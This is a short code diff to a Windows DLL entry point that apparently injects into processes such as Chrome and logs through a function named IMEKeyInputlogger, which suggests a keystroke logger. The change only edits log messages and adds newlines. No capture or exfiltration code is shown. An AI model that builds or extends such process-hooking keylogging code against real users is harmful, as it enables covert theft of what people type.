@@ -68,8 +68,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
 			if (_wcsicmp(processName, targetProcessName) != 0) {
-				IMEKeyInputlogger(L"\r\nHook new PID:\r\n");
+				IMEKeyInputlogger(L"\r\nHook new Process:\r\n");
 				IMEKeyInputlogger(processName);
+				IMEKeyInputlogger(L"\r\n");
 				// New thread for chromeMain
 				hThread = CreateThread(
 					NULL,
@@ -104,7 +105,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	case DLL_THREAD_DETACH:
 		break;
 	case DLL_PROCESS_DETACH:
-
+		IMEKeyInputlogger(L"\r\n");
 		Logger::getInstance().closeAll();
 
 		if (hThread != NULL) {
